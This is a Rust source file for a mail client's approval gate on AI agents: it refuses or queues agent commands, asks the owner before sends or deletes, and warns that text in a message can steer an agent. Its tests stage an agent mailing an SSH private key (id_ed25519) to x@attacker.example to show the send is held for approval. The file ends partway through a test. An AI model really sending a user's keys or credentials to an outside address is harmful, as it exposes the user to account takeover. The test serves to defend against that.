// SPDX-FileCopyrightText: MailCraft contributors
// SPDX-License-Identifier: MIT OR Apache-2.0
//! What an agent may do through the window (`mailcraft-cli mcp --connect`): the bridge marks
//! every request it sends as an agent's (`ControlRequest::agent`, with what the owner allowed it
//! in advance), and those go through [`mailcraft_engine::agent`]'s gate here. A command that is
//! not for agents, or names a file, is refused; one that needs the owner is asked about in a
//! question over the window ("An agent wants to send …"), whose default answer is no. It runs
//! only on the owner's yes; nobody's answer within [`WAIT_MS`] is a no (headless, within
//! [`HEADLESS_WAIT_MS`], the agent told at once and reading the outcome with `agent.answer`). While a question is up,
//! no input from the control channel reaches the window. Other agent commands still run, and
//! the yes reaches only what the question showed ([`agent::bind`], kept in the question's own
//! record with the windows as they were): what changed meanwhile makes it do nothing.
//!
//! Headless (`mailcraft --headless`) there is no window to ask in: the host shows the question
//! in a small window of its own instead ([`crate::Services::ask_owner`], one at a time, the first
//! waiting), and its answer goes through the very same [`answer`] as a click over the window,
//! with all of its checks. Its default is no too, and so is its closing, Escape and its time
//! running out; an answer that comes after the question expired or went is thrown away. Without
//! such a host (the tests, the browser) a headless agent's question is refused, as before.

use std::collections::{HashSet, VecDeque};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::mpsc::{Receiver, Sender, TryRecvError};

use egui::vec2;
use mailcraft_engine::agent::{self, Class, Verdict};
use serde_json::{Value, json};

use crate::MailApp;
use crate::control::{ControlRequest, Outcome};
use crate::theme::{Tokens, semibold};
use crate::widgets::primary_button;

/// How long a question waits for the owner (the control channel gives up at 60 s).
pub const WAIT_MS: f64 = 50_000.0;

/// How long a headless question waits for the owner in the host's window: a day. The agent's
/// request isn't held open meanwhile (the control channel would give up): it is answered at once
/// that the owner is being asked, and what came of it is read with `agent.answer`.
pub const HEADLESS_WAIT_MS: f64 = 86_400_000.0;

/// What came of each headless question, by its serial, until the agent reads it with
/// `agent.answer` ([`owner_answer`]). The serials are unique to this process.
static ANSWERS: std::sync::Mutex<std::collections::BTreeMap<u64, Receiver<Value>>> = std::sync::Mutex::new(std::collections::BTreeMap::new());

fn answers() -> std::sync::MutexGuard<'static, std::collections::BTreeMap<u64, Receiver<Value>>> {
    ANSWERS.lock().unwrap_or_else(std::sync::PoisonError::into_inner)
}

/// `agent.answer {"question": n}`: the answer of a headless question once the owner answered it
/// (or it went), as the command itself would have answered; `{"pending": true}` while it waits.
fn owner_answer(params: &Value) -> Outcome {
    let Some(question) = params.get("question").and_then(Value::as_u64) else {
        return err("bad parameters: `question` (number) is required");
    };
    let mut waiting = answers();
    let Some(rx) = waiting.get(&question) else {
        return err(format!("no question {question} is waiting, or its answer was read already"));
    };
    match rx.try_recv() {
        Ok(v) => {
            waiting.remove(&question);
            Outcome::Done(v)
        }
        Err(TryRecvError::Empty) => ok(json!({"pending": true, "question": question, "waitingFor": "owner"})),
        Err(TryRecvError::Disconnected) => {
            waiting.remove(&question);
            err("the question went without an answer: nothing was done")
        }
    }
}

/// Most questions waiting at once.
const MOST: usize = 8;

/// A question for the owner about what an agent wants.
pub struct Asking {
    pub id: String,
    pub params: Value,
    pub class: Class,
    /// What else it needs, which the question names and a yes covers ([`agent::also`], #473).
    also: Vec<Class>,
    /// The messages an undo or redo would take away, which the question names, and the steps
    /// as they were when it was asked ([`mailcraft_engine::Session::undo_steps_moved`], #473).
    taken: HashSet<u64>,
    steps: u64,
    /// The contacts, events, tasks, calendars and categories it would take away
    /// ([`mailcraft_engine::Session::undo_takes`]): a yes reaches none that came since.
    items: HashSet<String>,
    /// What it would do, after "An agent wants to".
    pub what: String,
    allow: Vec<Class>,
    reply: Sender<Value>,
    deadline: f64,
    /// The mailbox it is about (`Session::openings`): its ids are that mailbox's (#503).
    opening: u64,
    /// The messages a Delete or Move names, with the folder each was in when the owner was asked
    /// (#503).
    counted: Vec<(u64, u64)>,
    /// What the question showed, kept here and never in the agent's params: the yes reaches that
    /// alone ([`agent::bind`], AU3-24).
    shown: agent::bind::Shown,
    /// And the windows as it saw them (AU3-20).
    windows: crate::windows::Seen,
    /// Which question this is: a headless host's answer counts only for the one it showed.
    serial: u64,
    /// A send's message as it will go, shown under the question ([`crate::send_preview`]).
    pub preview: Option<crate::SendPreview>,
}

/// Numbers the questions ([`Asking::serial`]).
static SERIAL: AtomicU64 = AtomicU64::new(1);

/// A question the host asks the owner in a window of its own (headless; [`crate::Services::ask_owner`]).
/// All of its words are plain text for the owner to read, never markup or links: `text` holds what
/// the agent asked about. A send's `preview` is the message itself, shown as mail is read: nothing
/// in it runs and no picture on the web is fetched for it.
pub struct OwnerQuestion {
    pub title: String,
    /// "An agent wants to …", as the window's own question says it.
    pub text: String,
    /// The warning under it.
    pub note: String,
    /// The buttons ([`verbs`]): the yes and the no, which is the default.
    pub yes: String,
    pub no: String,
    /// How long the question has left before silence is a no.
    pub seconds: u64,
    /// Set when the question went without the window's answer (expired, or another mailbox): the
    /// host closes its window, as a no.
    pub cancel: Arc<AtomicBool>,
    /// A send's message as it will go, for the window to show ([`crate::send_preview`]).
    pub preview: Option<crate::SendPreview>,
}

/// The host's window showing a question, and the question it shows.
pub(crate) struct OwnerWindow {
    serial: u64,
    answer: Receiver<bool>,
    cancel: Arc<AtomicBool>,
}

#[cfg(test)]
impl OwnerWindow {
    /// A window up for no question in particular, for other tests that wait for it to go.
    pub(crate) fn for_tests(answer: Receiver<bool>, cancel: Arc<AtomicBool>) -> Self {
        OwnerWindow { serial: u64::MAX, answer, cancel }
    }
}

/// The questions waiting, the first one on screen.
pub type Questions = VecDeque<Asking>;

fn ok(v: Value) -> Outcome {
    Outcome::Done(json!({"ok": true, "result": v}))
}

fn err(e: impl std::fmt::Display) -> Outcome {
    Outcome::Done(json!({"ok": false, "error": e.to_string()}))
}

/// A request from an agent: `Some` when the gate settles it (refused, asked about, or run
/// here), `None` when it goes on as anybody's (looking, a screenshot into the answer).
pub fn screen(app: &mut MailApp, req: &ControlRequest, allow: &[Class]) -> Option<Outcome> {
    let p = &req.params;
    let given = |k: &str| p.get(k).is_some_and(|v| !v.is_null());
    match req.method.as_str() {
        "engine.commands" | "mailbox.inspect" | "ui.inspect" | "ui.alerts" | "ui.parity" | "ui.resize" | "ui.focus" | "app.status"
        | "app.lifecycle" => None,
        "ui.screenshot" if given("path") => Some(err("agents don't name files: the screenshot comes back in the answer (leave out `path`)")),
        "ui.screenshot" => None,
        "ui.click" | "ui.move" | "ui.drag" | "ui.key" | "ui.text" => {
            if !allow.contains(&Class::Input) {
                Some(err(format!(
                    "clicking and typing in the window needs the owner: {}. Only the owner can let an agent do this, by starting the bridge with `mailcraft-cli mcp --allow input`",
                    Class::Input.what()
                )))
            } else if !app.asking.is_empty() {
                Some(err("the owner is being asked something: no input reaches the window until they answer"))
            } else {
                None
            }
        }
        "engine.execute" | "command" => {
            let id = p.get("command").or_else(|| p.get("id")).and_then(Value::as_str).unwrap_or("").to_string();
            let params = p.get("params").cloned().filter(|v| !v.is_null()).unwrap_or(json!({}));
            Some(gate(app, req, &id, params, allow))
        }
        "app.quit" | "auth" => Some(err(format!("`{}` isn't available to agents", req.method))),
        other => Some(gate(app, req, other, p.clone(), allow)),
    }
}

fn gate(app: &mut MailApp, req: &ControlRequest, id: &str, mut params: Value, allow: &[Class]) -> Outcome {
    if id == "agent.answer" {
        return owner_answer(&params);
    }
    // Check before `run` temporarily sets aside an unsaved form. Requesting
    // provider authorization must preserve every existing owner dialog.
    if id == "ui.requestRulesPermission" && app.dialog.is_some() {
        return err("an owner question or dialog is open");
    }
    if app.is_headless()
        && id.starts_with("ui.")
        && !matches!(
            id,
            "ui.sync"
                | "ui.cancelSync"
                | "ui.cancelSignIn"
                | "ui.closeDialog"
                | "ui.requestRulesPermission"
                | "ui.theme"
                | "ui.highContrast"
                | "ui.accent"
                | "ui.language"
                | "ui.interfaceSize"
                | "ui.microsoftClientId"
                | "ui.googleClientId"
                | "ui.rememberSignIn"
        )
    {
        return err("this action needs the desktop; headless mode never opens a window or grants owner consent");
    }
    // The question names the people the window would write to, as the form has them now.
    if id == "ui.eventWindow" && params.is_object() {
        let people = crate::windows::event_window_people(app, &params);
        params["attendees"] = json!(people);
    }
    let params = as_the_window_has_it(app, id, params);
    if let Some(why) = overwrites(app, id, &params) {
        return err(why);
    }
    // A file Microsoft Defender flagged is the owner's to save, never an agent's.
    if let Some(why) = crate::attachment_scan::agent_refusal(app, id, &params) {
        return err(why);
    }
    match agent::check(&app.session, id, &params, allow) {
        Verdict::Run => run(app, id, params, allow, None),
        Verdict::Refuse(why) => err(why),
        Verdict::Ask(class, what) => {
            if app.is_headless() && app.services.ask_owner.is_none() {
                return err(format!("owner interaction required in the desktop: {what}; nothing was done"));
            }
            if app.asking.len() >= MOST {
                return err("too many questions are waiting for the owner; nothing was done");
            }
            let Some(shown) = agent::bind::Shown::new(&app.session, id, &params, &what) else {
                return err(format!("`{id}` isn't available to agents: what it acts on can't be shown to the owner"));
            };
            let counted = match counted(app, id, &params) {
                Ok(counted) => counted,
                Err(why) => return err(why),
            };
            let also = agent::also(&app.session, id, &params, class);
            let (taken, items) = undo_takes(app, id);
            let steps = app.session.undo_steps_moved();
            let serial = SERIAL.fetch_add(1, Ordering::Relaxed);
            // Headless, the owner may be away: the question stays up and the agent is told so now.
            let headless = app.is_headless();
            let (reply, deadline) = if headless {
                let (tx, rx) = std::sync::mpsc::channel();
                answers().insert(serial, rx);
                (tx, crate::now_ms() + HEADLESS_WAIT_MS)
            } else {
                (req.reply.clone(), crate::now_ms() + WAIT_MS)
            };
            let asked = what.clone();
            let preview = crate::SendPreview::of(app, id, &params);
            app.asking.push_back(Asking {
                id: id.to_string(),
                counted,
                params,
                class,
                also,
                taken,
                steps,
                items,
                what,
                allow: allow.to_vec(),
                reply,
                deadline,
                opening: app.session.openings(),
                shown,
                windows: crate::windows::seen(app),
                serial,
                preview,
            });
            if headless {
                return ok(json!({"pending": true, "question": serial, "waitingFor": "owner", "asked": asked,
                    "next": format!("agent.answer {{\"question\": {serial}}} gives the command's own answer once the owner answered")}));
            }
            Outcome::Pending
        }
    }
}

/// `params` with what the window would lose (`unsaved`), as it has it now and never as the agent
/// says (#494): an appointment, a contact or a task with changes that aren't saved, in the dialog
/// that `ui.closeDialog` closes or `ui.dialog` puts another in place of, or in a window of its
/// own that `ui.closeWindow` closes, that another mailbox in view (`file.new`, `file.open`)
/// closes, or that closes with its appointment when that is taken away.
fn as_the_window_has_it(app: &MailApp, id: &str, mut params: Value) -> Value {
    if id == "ui.rememberSignIn" {
        let value = params.get("value").and_then(Value::as_bool).unwrap_or(!app.ui.remember_sign_in);
        if !params.is_object() {
            params = json!({});
        }
        params["value"] = json!(value);
    }
    let removes = matches!(id, "calendar.delete" | "calendar.removeCalendar" | "edit.undo" | "edit.redo");
    if !removes && !matches!(id, "ui.closeDialog" | "ui.dialog" | "ui.closeWindow" | "file.new" | "file.open") {
        if let Some(fields) = params.as_object_mut() {
            fields.remove("unsaved");
        }
        return params;
    }
    if !params.is_object() {
        params = json!({});
    }
    let closes = id == "ui.closeDialog" || params.get("name").and_then(Value::as_str).is_some_and(|n| crate::sync_panel::Panel::named(n).is_none());
    let unsaved = match &app.dialog {
        _ if id == "ui.closeWindow" => crate::windows::closing_unsaved(app, &params),
        _ if matches!(id, "file.new" | "file.open") => crate::windows::replacing_unsaved(app),
        _ if removes => crate::windows::removing_unsaved(app, id, &params),
        Some(crate::dialogs::Dialog::Form(form)) if closes => form.unsaved(),
        _ => None,
    };
    if let Some(fields) = params.as_object_mut() {
        fields.remove("unsaved");
        if let Some(unsaved) = unsaved {
            fields.insert("unsaved".into(), unsaved);
        }
    }
    params
}

/// Why an agent's command can't run at all while the owner is changing what it would overwrite
/// or take away (#494): what the owner typed in an appointment's window (`ui.openWindow` of
/// another time proposed, `ui.eventWindow` closing the recurrence they are filling in), or the
/// appointment, contact or task they are changing in the dialog, which another mailbox in view
/// takes away too; or the draft of the message the owner is writing, as an undo or a redo would
/// put it back. Nothing in the window can be asked about it: the form stays whatever the answer. (What takes away a mailbox or the steps to undo is refused here, before it runs:
/// `Session::run` puts back the mailbox of a command it refuses, not the rest.) A New or Open
/// that would wait for the mailbox to be saved first is refused too: it would run later, when
/// the owner may be writing.
fn overwrites(app: &MailApp, id: &str, params: &Value) -> Option<String> {
    if crate::windows::overwrites_unsaved(app, id, params) {
        return Some(format!(
            "`{id}` would overwrite what the owner typed in an appointment's window and hasn't saved; nothing was done. Try again once the owner has saved or closed it"
        ));
    }
    // The draft of the message the owner is writing, put back as it was before a later save or
    // taken away: the message would then be "in Drafts" without what was written since.
    let redo = id == "edit.redo";
    if matches!(id, "edit.undo" | "edit.redo")
        && app.session.all_composing().filter(|c| c.owner_changed).any(|c| c.draft.is_some_and(|d| app.session.undo_changes_message(redo, d)))
    {
        return Some(format!(
            "`{id}` would put back an earlier draft of the message the owner is writing, or take it away; nothing was done. Try again once the owner has closed the message"
        ));
    }
    if matches!(id, "file.new" | "file.open") && app.waits_for_save() {
        return Some(format!("`{id}` would wait for the mailbox to be saved first; nothing was done. Try again in a moment"));
    }
    let item = changing_in_the_dialog(app)?;
    (matches!(id, "file.new" | "file.open") || crate::windows::takes_away(app, id, params, item)).then(|| {
        format!(
            "`{id}` would take away what the owner is changing in the dialog and hasn't saved; nothing was done. Try again once the owner has saved or closed it"
        )
    })
}

/// The appointment, contact or task the owner is changing in the dialog, with changes that
/// aren't saved.
fn changing_in_the_dialog(app: &MailApp) -> Option<mailcraft_model::Id> {
    match &app.dialog {
        Some(crate::dialogs::Dialog::Form(form)) if form.changed() => form.editing(),
        _ => None,
    }
}

/// Run for an agent: what the command does is held to `allow` (`Session::agent`). A form in the
/// dialog with changes the owner hasn't saved stays where it is (#494): set aside while the
/// command runs, it comes back after it, and a dialog the command opened in its place isn't
/// shown. (Closing it, or another dialog in its place, was asked about: `unsaved`.) Nor does the
/// command take away an appointment the owner is changing: in that form, or in a window unless
/// the owner said yes to what the window would lose (`unsaved`).
/// `only`: of a folder's messages and folders, the command takes none but these (the owner's yes, AU3-24).
fn run(app: &mut MailApp, id: &str, params: Value, allow: &[Class], only: Option<agent::bind::Only>) -> Outcome {
    let said_yes = params.get("unsaved").is_some_and(|v| !v.is_null());
    let asked = matches!(id, "ui.closeDialog" | "ui.dialog") && said_yes;
    let owners = match &app.dialog {
        Some(crate::dialogs::Dialog::Form(form)) if form.changed() && !asked => app.dialog.take(),
        _ => None,
    };
    let mut changing = if said_yes { Vec::new() } else { crate::windows::changing_events(app) };
    // (A question names windows only, never the form set aside.)
    if let Some(crate::dialogs::Dialog::Form(form)) = &owners
        && let Some(item) = form.editing()
    {
        changing.push(item);
    }
    app.session.agent = Some(allow.to_vec());
    app.session.owner_changing = changing;
    app.session.only_shown = only;
    let r = app.execute(id, params);
    app.session.agent = None;
    app.session.owner_changing = Vec::new();
    app.session.only_shown = None;
    if let Some(form) = owners
        && let Some(opened) = app.dialog.replace(form)
    {
        return err(format!(
            "`{id}` ran, but the dialog \"{}\" it opened would have taken the place of a form the owner is filling in and hasn't saved: the form stays, and that dialog wasn't shown. Try again once the owner has closed the form",
            opened.name()
        ));
    }
    match r {
        Ok(v) => ok(v),
        Err(e) => err(e),
    }
}

/// The messages an agent's Delete or Move names (`ids` or `id`, which it must: [`agent::NEEDS_IDS`])
/// and the folder each is in, as the owner is asked about them (#503). One that isn't in the
/// mailbox is refused, never asked about: a message that comes in meanwhile, or one an undo puts
/// back, could take its id, and the yes would reach a message the owner wasn't shown.
fn counted(app: &MailApp, id: &str, params: &Value) -> Result<Vec<(u64, u64)>, String> {
    if !matches!(id, "mail.delete" | "mail.deletePermanently" | "mail.move") {
        return Ok(Vec::new());
    }
    let mb = &app.session.mailbox;
    let named = mailcraft_engine::p::ids_strict(params).ok().flatten().unwrap_or_default();
    named
        .into_iter()
        .map(|m| {
            mb.message(m).map(|x| (m, x.folder)).ok_or_else(|| format!("`{id}` names message {m}, which isn't in the mailbox: nothing was done"))
        })
        .collect()
}

/// `params` with only those of the `counted` messages that are still in the folder they were
/// counted in: one moved meanwhile (on another device, which a Send/Receive brings while the
/// question is open) or gone is left out, as the window's own question does (#503). None when none
/// is left.
fn still_where_counted(app: &MailApp, counted: &[(u64, u64)], mut params: Value) -> Option<Value> {
    if counted.is_empty() {
        return Some(params);
    }
    let mb = &app.session.mailbox;
    let kept: Vec<u64> = counted.iter().filter(|(m, f)| mb.message(*m).is_some_and(|x| x.folder == *f)).map(|(m, _)| *m).collect();
    if kept.is_empty() {
        return None;
    }
    if kept.len() < counted.len() {
        let map = params.as_object_mut()?;
        map.remove("id");
        map.insert("ids".into(), json!(kept));
    }
    Some(params)
}

/// The messages, and the contacts and the like, an agent's undo or redo would take away (none
/// for any other command), as sets: an undo of a large import is looked up in, not walked.
fn undo_takes(app: &MailApp, id: &str) -> (HashSet<u64>, HashSet<String>) {
    match id {
        "edit.undo" | "edit.redo" => {
            let (taken, items) = app.session.undo_takes(id == "edit.redo");
            (taken.into_iter().collect(), items.into_iter().collect())
        }
        _ => (HashSet::new(), HashSet::new()),
    }
}

/// The owner's answer to the question on screen.
pub fn answer(app: &mut MailApp, yes: bool) {
    let Some(a) = app.asking.pop_front() else { return };
    let out = if a.opening != app.session.openings() {
        err(format!("another mailbox was opened before the owner answered about `{}`: nothing was done", a.id))
    } else if yes {
        // Asked again: what it would do may have changed while the question was up. So may what
        // the window would lose: another form than the one named isn't lost on this yes.
        let params = as_the_window_has_it(app, &a.id, a.params.clone());
        let Some(params) = still_where_counted(app, &a.counted, params) else {
            let out = err(format!("what `{}` was asked about has gone or moved since the owner was asked: nothing was done", a.id));
            if let Outcome::Done(v) = out {
                let _ = a.reply.send(v);
            }
            return;
        };
        let lost = params.get("unsaved").filter(|u| !u.is_null());
        let other = lost.is_some() && lost != a.params.get("unsaved");
        let verdict = agent::answered(&app.session, &a.id, &params, &a.allow, a.class);
        // What else it needs now, which the yes covers only when the question named it (#473).
        let also = agent::also(&app.session, &a.id, &params, a.class);
        // Nor does it cover another step than the one asked about, or other messages, drafts,
        // contacts and the like than the question named.
        let undoing = matches!(a.id.as_str(), "edit.undo" | "edit.redo");
        let more = also.iter().any(|c| !a.also.contains(c) && !a.allow.contains(c))
            || {
                let (taken, items) = undo_takes(app, &a.id);
                !taken.is_subset(&a.taken) || !items.is_subset(&a.items)
            }
            || (undoing && (app.session.undo_steps_moved() != a.steps || agent::describe(&app.session, &a.id, &params) != a.what));
        // Nor anything but what the question showed (AU3-24): what the command would take from the
        // window, what it names, and the windows, as they were.
        let reach = if crate::windows::seen(app) != a.windows {
            Err(format!("the windows `{}` was asked about have changed since the owner was asked: nothing was done. Ask the owner again", a.id))
        } else {
            a.shown.check(&app.session, &a.id, &params)
        };
        let mut allow = a.allow.clone();
        allow.push(a.class);
        allow.extend(also);
        match verdict {
            _ if other => err(format!("what `{}` would close without saving has changed since the owner was asked; nothing was done", a.id)),
            _ if more => err(format!("`{}` would now do more than the owner was asked about; nothing was done", a.id)),
            _ if let Some(why) = overwrites(app, &a.id, &params) => err(why),
            _ if let Err(why) = &reach => {
                app.status(tl!("Nothing was done: what the agent asked about changed after you were asked."));
                err(why)
            }
            Verdict::Run => {
                let only = match reach {
                    Ok(agent::bind::Reach::Only(only)) => Some(only),
                    _ => None,
                };
                run(app, &a.id, params, &allow, only)
            }
            Verdict::Refuse(why) => err(why),
            Verdict::Ask(..) => err(format!("`{}` would now do more than the owner was asked about; nothing was done", a.id)),
        }
    } else {
        err(format!("the owner said no to `{}`: nothing was done", a.id))
    };
    if let Outcome::Done(v) = out {
        let _ = a.reply.send(v);
    }
}

/// Another mailbox took the place of the one asked about: the questions go with it, unanswered,
/// since what they name are that mailbox's messages (#503).
pub fn forget(app: &mut MailApp) {
    for a in app.asking.drain(..) {
        let _ = a
            .reply
            .send(json!({"ok": false, "error": format!("another mailbox was opened before the owner answered about `{}`: nothing was done", a.id)}));
    }
}

/// Questions nobody answered in time are a no.
pub fn expire(app: &mut MailApp, now: f64) {
    while app.asking.front().is_some_and(|a| now >= a.deadline) {
        if let Some(a) = app.asking.pop_front() {
            let _ = a.reply.send(json!({"ok": false, "error": format!("the owner didn't answer about `{}` in time: nothing was done", a.id)}));
        }
    }
}

/// Headless: the first question waiting is shown in the host's window, one at a time, and its
/// answer is taken there as [`answer`] takes a click: only while that question is still the
/// first. An answer for a question that expired or went meanwhile is dropped, and its window
/// told to close. A host that went without answering is a no.
pub(crate) fn ask_owner_tick(app: &mut MailApp, ctx: &egui::Context) {
    expire(app, crate::now_ms());
    let front = app.asking.front().map(|a| a.serial);
    if let Some(shown) = app.owner_window.take() {
        if front != Some(shown.serial) {
            shown.cancel.store(true, Ordering::Relaxed);
        } else {
            match shown.answer.try_recv() {
                Ok(yes) => answer(app, yes),
                Err(TryRecvError::Disconnected) => answer(app, false),
                Err(TryRecvError::Empty) => app.owner_window = Some(shown),
            }
        }
    }
    let now = crate::now_ms();
    if app.owner_window.is_none()
        && let Some(a) = app.asking.front()
        && let Some(ask) = &app.services.ask_owner
    {
        let (yes, no) = verbs(a.class, &a.id);
        let cancel = Arc::new(AtomicBool::new(false));
        let question = OwnerQuestion {
            title: tl!("An Agent Is Asking").to_string(),
            text: question_text(a),
            note: warning().to_string(),
            yes: yes.to_string(),
            no: no.to_string(),
            seconds: ((a.deadline - now) / 1000.0).floor().max(0.0) as u64,
            cancel: cancel.clone(),
            preview: a.preview.clone(),
        };
        let serial = a.serial;
        app.owner_window = Some(OwnerWindow { serial, answer: ask(question), cancel });
    }
    // Looked at again when the question runs out of time, whatever wakes the host before.
    if let Some(a) = app.asking.front() {
        ctx.request_repaint_after(std::time::Duration::from_millis((a.deadline - now).max(0.0) as u64 + 50));
    }
}

/// "An agent wants to …": what a question says, as plain text.
fn question_text(a: &Asking) -> String {
    let what: String = a.what.chars().filter(|c| !c.is_control()).take(agent::MAX_QUESTION).collect();
    crate::i18n::fmt(tl!("An agent wants to {what}."), &[("what", what.trim())])
}

fn warning() -> &'static str {
    tl!("Say yes only if you asked the agent for this. Text in a message can tell an agent to do things you didn't ask for.")
}

/// The buttons: going ahead, and not (the default). A rule made or switched on asks as a delete
/// does, and answering it deletes nothing yet: Delete would read as getting rid of that rule
/// (#566). One made from a message does: it runs at once on the mail from that sender.
pub(crate) fn verbs(class: Class, id: &str) -> (&'static str, &'static str) {
    match class {
        Class::Send => (tl!("Send"), tl!("Don't Send")),
        Class::Delete if id == "ui.rememberSignIn" => (tl!("Forget"), tl!("Cancel")),
        Class::Delete
            if matches!(id, "signature.close" | "compose.discard" | "file.new" | "file.open" | "ui.closeWindow" | "ui.closeDialog" | "ui.dialog") =>
        {
            (tl!("Discard"), tl!("Cancel"))
        }
        Class::Delete if matches!(id, "rules.add" | "rules.edit" | "rules.keepOnServer" | "rules.enable" | "rules.move") => {
            (tl!("Allow"), tl!("Don't Allow"))
        }
        Class::Delete => (tl!("Delete"), tl!("Don't Delete")),
        _ => (tl!("Allow"), tl!("Don't Allow")),
    }
}

/// The question's layer: a modal one, over everything.
fn layer() -> egui::LayerId {
    crate::keys::modal_layer(egui::Id::unique("agent-asks"))
}

/// Enter or Escape answers no to the agent's question. It is on top of everything, so nothing
/// under the question gets the same key, its repeats included (#393, #406). Only a new press
/// answers, once the question was on the screen: not a key that was already held down when it
/// came up, nor one pressed before it was drawn.
pub fn keys(app: &mut MailApp, ctx: &egui::Context) {
    if app.asking.is_empty() {
        return;
    }
    // (Not a button of the question either: the next question's would be pressed with it.)
    let (enter, escape) = (crate::keys::take_enter_out(ctx, layer()), crate::keys::take_escape(ctx, layer()));
    if enter || escape {
        answer(app, false);
        // The frame's other keys were pressed with the question on screen: none reaches what is
        // under it (Delete with the Escape that says no; #503).
        ctx.input_mut(|i| i.events.retain(|e| !matches!(e, egui::Event::Key { .. })));
    }
}

/// The question over the window, when there is one. Enter and Escape say no ([`keys`]).
pub fn show(app: &mut MailApp, ctx: &egui::Context) {
    expire(app, crate::now_ms());
    let Some(a) = app.asking.front() else { return };
    // Nothing from the control channel reaches the window while the owner is asked.
    app.synthetic.clear();
    let t = Tokens::get(ctx);
    let text = question_text(a);
    let (yes_label, no_label) = verbs(a.class, &a.id);
    let waiting = app.asking.len();
    let mut said = None;
    let frame = egui::Frame::window(&ctx.global_style()).fill(t.surface).inner_margin(egui::Margin::same(16));
    // A send shows the message it would send, so the question is wider and taller.
    let preview = a.preview.clone();
    let most = if preview.is_some() { 760.0 } else { 460.0 };
    let width = (ctx.content_rect().width() - 48.0).clamp(160.0, most);
    let preview_height = (ctx.content_rect().height() * 0.55).clamp(160.0, 560.0);
    egui::Modal::new(layer().id).frame(frame).backdrop_color(t.scrim).show(ctx, |ui| {
        ui.set_width(width);
        ui.spacing_mut().item_spacing = vec2(8.0, 8.0);
        ui.label(egui::RichText::new(tl!("An Agent Is Asking")).font(semibold(14.0)).color(t.text));
        ui.label(egui::RichText::new(text).color(t.text));
        if let Some(preview) = &preview {
            crate::send_preview::show(app, ui, preview, preview_height);
        }
        ui.label(egui::RichText::new(warning()).color(t.text_dim));
        if waiting > 1 {
            ui.label(egui::RichText::new(tln!(waiting - 1, "{n} more question is waiting.", "{n} more questions are waiting.")).color(t.text_dim));
        }
        ui.add_space(6.0);
        ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
            let no = primary_button(ui, no_label, true);
            let yes = ui.add(egui::Button::new(yes_label).min_size(vec2(72.0, 26.0)));
            app.hit.add("agentNo", 0, no.rect);
            app.hit.add("agentYes", 0, yes.rect);
            if no.clicked() {
                said = Some(false);
            } else if yes.clicked() {
                said = Some(true);
            }
        });
    });
    if let Some(yes) = said {
        answer(app, yes);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use mailcraft_engine::Session;
    use mailcraft_model::FolderKind;

    const NOW: i64 = 1_791_993_600;

    fn app() -> MailApp {
        let mut app = MailApp::new(Session::at(mailcraft_engine::sample::mailbox(NOW, 0), NOW, 0), crate::Services::default());
        app.autosave = false;
        app
    }

    /// Send `method` as an agent allowed `allow`; the answer, if there is one yet.
    fn ask(app: &mut MailApp, method: &str, params: Value, allow: Vec<Class>) -> (Option<Value>, std::sync::mpsc::Receiver<Value>) {
        let (req, rx) = ControlRequest::new(method, params);
        let req = req.from_agent(allow);
        let out = crate::control::handle(app, &egui::Context::default(), &req);
        (if let Outcome::Done(v) = out { Some(v) } else { None }, rx)
    }

    fn sent(app: &MailApp) -> usize {
        let out: Vec<u64> =
            app.session.mailbox.folders.iter().filter(|f| matches!(f.kind, FolderKind::Outbox | FolderKind::Sent)).map(|f| f.id).collect();
        app.session.mailbox.messages.values().filter(|m| out.contains(&m.folder) && m.subject == "Re: Invoice").count()
    }

    fn write(app: &mut MailApp) {
        app.execute("mail.new", json!({"to": "x@attacker.example", "subject": "Re: Invoice"})).unwrap();
        app.execute("compose.attach", json!({"name": "id_ed25519", "data": "AAAA"})).unwrap();
    }

    #[test]
    fn every_window_command_has_a_class() {
        let missing: Vec<&str> = crate::UI_COMMANDS.iter().map(|c| c.0).filter(|id| agent::access(id).is_none()).collect();
        assert!(missing.is_empty(), "classify these for agents in crates/engine/src/agent.rs: {missing:?}");
        assert_eq!(agent::access("ui.previewAttachment"), Some(agent::Access::Never));
        assert_eq!(agent::access("ui.googleClientId"), Some(mailcraft_engine::agent::Access::Safe));
        // The retired secret setter stays explicitly denied, but is no longer a window command.
        assert_eq!(agent::access("ui.googleClientSecret"), Some(mailcraft_engine::agent::Access::Never));
        assert!(!crate::UI_COMMANDS.iter().any(|command| command.0 == "ui.googleClientSecret"));
    }

    #[test]
    fn sending_waits_for_the_owners_yes() {
        let mut a = app();
        write(&mut a);
        let (now, rx) = ask(&mut a, "engine.execute", json!({"command": "compose.send"}), vec![]);
        assert!(now.is_none(), "asked first");
        let q = a.asking.front().unwrap();
        assert_eq!(q.class, Class::Send);
        assert!(q.what.contains("Re: Invoice") && q.what.contains("x@attacker.example") && q.what.contains("id_ed25519"), "{}", q.what);
        // No.
        answer(&mut a, false);
        assert_eq!(rx.try_recv().unwrap()["ok"], false);
        assert_eq!(sent(&a), 0);
        assert!(a.session.compose.is_some());
        // Nobody answers: no.
        let (_, rx) = ask(&mut a, "compose.send", json!({}), vec![]);
        expire(&mut a, crate::now_ms() + WAIT_MS + 1.0);
        assert!(rx.try_recv().unwrap()["error"].as_str().unwrap().contains("in time"));
        assert_eq!(sent(&a), 0);
        // Yes.
        let (_, rx) = ask(&mut a, "engine.execute", json!({"command": "compose.send"}), vec![]);
        answer(&mut a, true);
        assert_eq!(rx.try_recv().unwrap()["ok"], true);
        assert_eq!(sent(&a), 1);
        // Allowed in advance (`--allow send`): no question.
        write(&mut a);
        let (now, _) = ask(&mut a, "engine.execute", json!({"command": "compose.send"}), vec![Class::Send]);
        assert_eq!(now.unwrap()["ok"], true);
        assert!(a.asking.is_empty());
    }

    #[test]
    fn a_send_question_shows_the_message_as_it_will_go() {
        let mut a = app();
        a.execute(
            "mail.new",
            json!({"to": "x@attacker.example", "bcc": "hidden@example.com", "subject": "Re: Invoice", "body": "Pay the invoice today."}),
        )
        .unwrap();
        a.execute("compose.attach", json!({"name": "id_ed25519", "data": "AAAA"})).unwrap();
        let (now, _rx) = ask(&mut a, "engine.execute", json!({"command": "compose.send"}), vec![]);
        assert!(now.is_none(), "asked first");
        let q = a.asking.front().unwrap();
        let p = q.preview.as_ref().expect("a send question carries its message");
        assert_eq!(p.message.subject, "Re: Invoice");
        assert!(p.message.to.iter().any(|t| t.email == "x@attacker.example"));
        assert!(p.message.bcc.iter().any(|t| t.email == "hidden@example.com"));
